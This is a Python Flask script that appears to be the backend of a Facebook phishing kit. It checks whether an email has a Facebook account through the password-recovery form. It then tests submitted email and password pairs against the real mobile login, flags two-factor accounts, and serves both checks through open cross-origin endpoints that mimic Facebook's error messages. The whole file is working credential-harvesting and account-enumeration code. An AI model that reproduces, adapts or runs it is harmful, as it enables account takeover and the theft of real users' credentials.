import requests

from bs4 import BeautifulSoup
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS, cross_origin

app = Flask(__name__)
CORS(app, support_credentials=True)


class Facebook:
    def __init__(self) -> None:
        pass


    def get_data(self):
        url = 'https://m.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0'

        headers = {
            'Accept': '*/*',
            'Pragma': 'no-cache',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        }

        rq = requests.get(url,headers=headers)

        # print(rq.text)

        soup = BeautifulSoup(rq.text, 'html.parser')

        # find jazoest
        jazoest = soup.find('input', {'name': 'jazoest'}).get('value')
        # find lsd
        lsd = soup.find('input', {'name': 'lsd'}).get('value')

        cookie = rq.cookies.get_dict()['datr']
        
        print(jazoest, lsd, cookie)

        return jazoest, lsd, cookie
    
    def check_valid_account(self, email: str):
        url = 'https://m.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0'

        jazoest, lsd, cookie = self.get_data()

        # payload = f'lsd={lsd}&jazoest={jazoest}&email={email}&did_submit=T%C3%ACm+ki%E1%BA%BFm'
        payload = f'lsd={lsd}&jazoest={jazoest}&email={email}&did_submit=Rechercher'
          
        headers = {
            'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
            'Referer': 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=2&ars=facebook_login&alternate_search=0&toggle_search_mode=1',
            'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
            'Host': 'm.facebook.com',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache',
            'Cookie':f'datr={cookie}',
            'Content-Length': '84',
        }
        

        proxies = {
            'http': 'http://user:pass@geo.iproyal.com:12321',
            'https': 'http://user:pass@geo.iproyal.com:12321'
        }

        rq = requests.post(url, data=payload, headers=headers)

        with open('test.html', 'w', encoding='utf-8') as f:
            f.write(rq.text)

        # if rq.status_code == 200:
        #     return False
        # elif rq.status_code == 302:
        #     return True

        if 'Votre recherche ne donne aucun' in rq.text:
            return False
        else:
            return True
        

    def get_data_password(self):
        url = 'https://mbasic.facebook.com/'
        headers = {
            'Accept': '*/*',
            'Pragma': 'no-cache',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        }

        rq = requests.get(url,headers=headers)

        # print(rq.text)

        soup = BeautifulSoup(rq.text, 'html.parser')

        # find jazoest
        jazoest = soup.find('input', {'name': 'jazoest'}).get('value')
        # find lsd
        lsd = soup.find('input', {'name': 'lsd'}).get('value')

        li = soup.find('input', {'name': 'li'}).get('value')

        m_ts = soup.find('input', {'name': 'm_ts'}).get('value')

        try_number = soup.find('input', {'name': 'try_number'}).get('value')

        unrecognized_tries = soup.find('input', {'name': 'unrecognized_tries'}).get('value')

        cookie = rq.cookies.get_dict()['datr']

        # print(jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie)

        return jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie
    

    def check_password(self, user: str, password: str):
        url = 'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'

        jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie = self.get_data_password()

        headers = {
            'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
            'Referer': 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=2&ars=facebook_login&alternate_search=0&toggle_search_mode=1',
            'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
            'Host': 'm.facebook.com',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache',
            'Cookie': f'datr={cookie}',
            'Content-Length': '84',
        }

        payload = f'lsd={lsd}&jazoest={jazoest}&m_ts={m_ts}&li={li}&try_number={try_number}&unrecognized_tries={unrecognized_tries}&email={user}&pass={password}&login=Se+connecter&bi_xrwh=0'

        rq = requests.post(url, data=payload, headers=headers)

        with open('test.html', 'w', encoding='utf-8') as f:
            f.write(rq.text)

        if '/login/device-based/update-nonce/' in rq.text:
            return True
        elif 'submit[Submit Code]' in rq.text:
            return '2fa'
        else:
            return False


@app.route('/check-email', methods=['POST'])
@cross_origin(supports_credentials=True)
def check_email():
    data = request.get_json()
    
    email = data.get('email')
    fb = Facebook()
    
    result = fb.check_valid_account(email);
    
    if result:
        return jsonify({
            "message": "Successfully...", 
            "status": 200, 
            "email": email
            })
    else:
        return jsonify({
            "message": "The mobile number you entered is not connected to any account. Find your account and log in.", 
            "status": 400})

@app.route('/check-password', methods=['POST'])
@cross_origin(supports_credentials=True)
def check_password():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')

    fb = Facebook()
    is_login_successful = fb.check_password(email, password)
    
    if is_login_successful == True or is_login_successful == '2fa':
        return jsonify({
            "message": "Successfully...", 
            "status": 200, 
            "email": password
            })
       
    else:
         return jsonify({
            "message": "The mobile number you entered is not connected to any account. Find your account and log in.", 
            "status": 400})
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)